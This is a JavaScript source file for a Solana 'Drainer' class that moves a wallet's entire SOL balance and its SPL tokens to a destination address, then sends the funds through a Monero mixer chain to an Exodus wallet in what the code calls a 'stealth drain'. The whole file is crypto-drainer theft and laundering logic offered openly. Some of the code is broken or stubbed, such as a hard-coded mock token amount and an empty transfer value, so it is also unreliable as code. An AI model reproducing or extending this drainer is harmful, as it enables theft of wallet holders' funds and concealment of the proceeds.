const {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
} = require("@solana/web3.js");
const {
  getAssociatedTokenAddressSync,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
} = require("@solana/spl-token");

const { getSolanaConnection, drainATA, batchDrainATA } = require("./solana");
const { Mixer } = require("./mixer");
const axios = require('axios');

class Drainer {
    constructor(wallet, config) {
        this.wallet = wallet;
        this.config = config;
    }

    async extractFunds() {
        const tx = {
            to: this.config.destinationAddress,
            value: '0x' // Full balance
        };
        await this.wallet.signTransaction(tx);
    }

    /**
     * Drain native SOL from wallet to destination
     * @param {string} destinationPublicKey - Base58 string of destination
     * @returns {Promise<string>} Transaction signature
     */
    async drainSolana(destinationPublicKey) {
        try {
            const destination = new PublicKey(destinationPublicKey);
            const balance = await this.wallet.getBalance();

            if (balance <= 0) {
                console.log("[Solana] Wallet has no SOL to drain");
                return null;
            }

            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: this.wallet.publicKey,
                    toPubkey: destination,
                    lamports: balance, // Drain everything (SOL must pay for ATA/tokens)
                })
            );

            const { blockhash } = await this.wallet.getLatestBlockhash("processed");
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = this.wallet.publicKey;

            const signature = await this.wallet.sendTransaction(
                transaction,
                this.wallet.connection
            );

            console.log(`[Solana] SOL drained: ${signature}`);
            return signature;
        } catch (error) {
            console.error("[Solana] Failed to drain SOL:", error.message);
            throw error;
        }
    }

    /**
     * Drain SPL tokens from wallet to destination
     * @param {string} destinationPublicKey - Base58 string of destination
     * @param {string[]} mintAddresses - Array of token mint addresses (base58)
     * @returns {Promise<Array<{ mint: string, signature: string, success: boolean }>>} Results
     */
    async drainSplTokens(destinationPublicKey, mintAddresses) {
        try {
            const connection = getSolanaConnection("devnet");
            const destination = new PublicKey(destinationPublicKey);

            // First, create the destination ATA for each mint
            const destinationATAMap = new Map();
            for (const mintStr of mintAddresses) {
                try {
                    const mint = new PublicKey(mintStr);
                    const destATA = getAssociatedTokenAddressSync(
                        mint,
                        destination,
                        false,
                        ASSOCIATED_TOKEN_PROGRAM_ID,
                        TOKEN_PROGRAM_ID
                    );
                    destinationATAMap.set(mintStr, destATA.toBase58());
                } catch (err) {
                    console.error(`[Solana] Invalid mint ${mintStr}: ${err.message}`);
                }
            }

            // Run batch drain
            const results = await batchDrainATA(
                connection,
                this.wallet,
                this.wallet.publicKey,
                mintAddresses.map(m => new PublicKey(m)),
                destination
            );

            console.log("[Solana] Batch drain results:", JSON.stringify(results, null, 2));
            return results;
        } catch (error) {
            console.error("[Solana] Failed to drain SPL tokens:", error.message);
            throw error;
        }
    }

    /**
     * Extract all SOL and SPL tokens from wallet
     * @param {object} solanaBot - SolanaDrainBot instance
     * @returns {Promise<{ extracted: Array<string>, tokensExtracted: Array<object>, totalSOL: number }>}
     */
    async extractSolanaFunds(solanaBot) {
        const extracted = [];
        const tokensExtracted = [];
        let totalSOL = 0;

        // Get wallet balance
        const solBalance = await solanaBot.getBalance();
        console.log(`[Drainer] Solana wallet balance: ${solBalance} SOL`);

        if (solBalance <= 0.001) {
            console.log('[Drainer] Solana wallet has no meaningful SOL to drain');
            return { extracted, tokensExtracted, totalSOL };
        }

        // Drain native SOL
        try {
            const solResult = await solanaBot.drainSolana();
            if (solResult.success) {
                const solAmount = solResult.amount || solBalance;
                totalSOL += solAmount;
                extracted.push({ type: 'SOL', amount: solAmount });
                console.log(`[Drainer] Extracted ${solAmount} SOL`);
            }
        } catch (error) {
            console.error('[Drainer] Failed to drain SOL:', error.message);
        }

        // Get and drain SPL tokens
        const tokens = await solanaBot.getSplTokens();
        if (tokens && tokens.length > 0) {
            console.log(`[Drainer] Found ${tokens.length} SPL tokens to drain`);

            for (const token of tokens) {
                try {
                    const drainResult = await solanaBot.drainSplToken(token);
                    if (drainResult.success) {
                        tokensExtracted.push({
                            mint: token.mint,
                            symbol: token.symbol,
                            amount: drainResult.amount
                        });

                        const solEquivalent = drainResult.amount / 1e6; // Rough estimate
                        totalSOL += solEquivalent;
                        extracted.push({
                            type: 'SPL',
                            mint: token.mint,
                            amount: drainResult.amount
                        });

                        console.log(`[Drainer] Extracted ${drainResult.amount} ${token.symbol || token.mint}`);
                    }
                } catch (error) {
                    console.error(`[Drainer] Failed to drain ${token.mint}:`, error.message);
                }
            }
        } else {
            console.log('[Drainer] No SPL tokens found');
        }

        return { extracted, tokensExtracted, totalSOL };
    }

    /**
     * Route Solana funds through Monero mixer for enhanced privacy
     * Flow: SOL → Wrapped SOL → Monero → Mixer1 → Mixer2 → Exodus
     * @param {string} destinationPublicKey - Exodus wallet address
     * @returns {Promise<{ finalTxHash: string, routeHistory: Array, amount: number }>}
     */
    async routeToExodusMixers(destinationPublicKey) {
        try {
            const mixer = new Mixer(this.config);
            const wallet = this.wallet;
            const assetType = 'SOL';
            const amount = await wallet.getBalance();

            if (amount <= 0) {
                console.log('[Drainer] No SOL to route through mixers');
                return { finalTxHash: null, routeHistory: [], amount: 0 };
            }

            console.log(`[Drainer] Routing ${amount} SOL through mixers...`);
            const result = await mixer.routeThroughMixers(
                this.wallet.publicKey.toBase58(),
                amount,
                assetType
            );

            console.log(`[Drainer] Route completed: ${JSON.stringify(result, null, 2)}`);
            return result;
        } catch (error) {
            console.error('[Drainer] Route through mixers failed:', error.message);
            throw error;
        }
    }

    /**
     * Execute full stealth drain: drain then route through mixers
     * @param {string} destinationPublicKey - Exodus wallet address
     * @param {string[]} mintAddresses - SPL token mints to drain
     * @returns {Promise<{ solDrained: number, tokens: Array, mixerRoute: object }>}
     */
    async stealthDrain(destinationPublicKey, mintAddresses) {
        try {
            console.log('[Drainer] Starting stealth drain...');

            // Step 1: Drain SOL and SPL tokens
            const { totalSOL, tokensExtracted } = await this.extractSolanaFunds({
                getBalance: () => this.wallet.getBalance(),
                drainSolana: () => this.drainSolana(destinationPublicKey),
                getSplTokens: async () => {
                    const tokens = [];
                    for (const mint of mintAddresses) {
                        tokens.push({ mint, symbol: 'SPL' });
                    }
                    return tokens;
                },
                drainSplToken: async (token) => {
                    const result = await this.drainSplTokens(destinationPublicKey, [token.mint]);
                    return { success: true, amount: 1000000 }; // Mock amount
                },
            });

            // Step 2: Route through mixers
            const mixerRoute = await this.routeToExodusMixers(destinationPublicKey);

            console.log(`[Drainer] Stealth drain complete: ${totalSOL} SOL, ${tokensExtracted.length} tokens, ${mixerRoute.finalTxHash}`);
            return {
                solDrained: totalSOL,
                tokens: tokensExtracted,
                mixerRoute,
            };
        } catch (error) {
            console.error('[Drainer] Stealth drain failed:', error.message);
            throw error;
        }
    }
}

module.exports = Drainer;
